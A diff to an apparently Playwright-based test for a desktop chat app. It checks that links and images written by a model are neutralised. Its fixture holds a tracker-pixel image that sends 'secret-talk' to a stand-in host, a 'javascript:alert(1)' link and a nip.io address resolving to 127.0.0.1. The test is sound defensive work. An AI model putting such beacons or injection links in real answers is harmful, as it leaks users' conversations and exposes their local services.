@@ -716,24 +716,52 @@ const tests = {
               id: "m2",
               role: "assistant",
               content:
-                "Here:\n\n![tracker](https://tracker.example/pixel.gif?c=secret-talk)\n\nAnd [evil](javascript:alert(1)).",
+                "Here:\n\n![tracker](https://tracker.example/pixel.gif?c=secret-talk)\n\nAnd [evil](javascript:alert(1)) and [good](https://example.com/page) and [inward](https://foo.127.0.0.1.nip.io/).",
               createdAt: 2,
             },
           ],
         },
       ],
     });
-    await page.goto(APP);
+    await stubDoor(page, {});
+    // `goto` lands on the brain home; the chat and its sidebar are one click
+    // past it (the same conditional click `shots.mjs` makes).
+    await openChat(page);
     await page.waitForTimeout(1200);
     await openSidebar(page, "Sneaky model");
+    await page.waitForTimeout(300);
     check("imgblocked: zero img elements", (await page.locator(".thread img").count()) === 0);
     check("imgblocked: notice shown", (await page.locator(".blocked-image").count()) === 1);
+    // Not one anchor in the answer: a link the model wrote is a button now, and
+    // a Tauri webview cannot follow an `href` anyway (2026-09-19, the same
+    // defect as the tool sources).
+    check("imgblocked: no hrefs at all in the answer", (await page.locator(".thread a").count()) === 0, `${await page.locator(".thread a").count()} anchors`);
+    const shown = (await page.locator(".thread").textContent()) ?? "";
+    check("imgblocked: a refused address is shown as text", shown.includes("evil") && shown.includes("inward"), shown.slice(0, 200));
     check(
-      "imgblocked: no javascript: hrefs",
-      (await page.locator('.thread a[href^="javascript"]').count()) === 0,
+      "imgblocked: no address that resolves back to this machine is clickable",
+      (await page.locator(".thread .tool-link").allTextContents()).every((label) => !label.includes("nip.io")),
+      JSON.stringify(await page.locator(".thread .tool-link").allTextContents()),
     );
-    const href = await page.locator(".blocked-image a").getAttribute("href");
-    check("imgblocked: address openable by hand", href === "https://tracker.example/pixel.gif?c=secret-talk");
+
+    // "Open address" beside the blocked image, and a link the model wrote: both
+    // are commands now, with the address Rust checks.
+    const links = await page.locator(".thread .tool-link").allTextContents();
+    check("imgblocked: the good link and the image address are offered", links.length === 2, JSON.stringify(links));
+    await page.locator(".blocked-image .tool-link").click();
+    await page.waitForTimeout(300);
+    await page.getByRole("link", { name: "good" }).click().catch(async () => {
+      await page.locator(".tool-link", { hasText: "good" }).click();
+    });
+    await page.waitForTimeout(300);
+    const opened = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((call) => call.command === "brain_open_url");
+    check(
+      "imgblocked: both clicks ask Rust to open the address",
+      opened.length === 2 &&
+        opened[0].args?.url === "https://tracker.example/pixel.gif?c=secret-talk" &&
+        opened[1].args?.url === "https://example.com/page",
+      JSON.stringify(opened),
+    );
     let external = 0;
     page.on("request", (req) => {
       if (!req.url().startsWith("http://localhost:5173")) external++;
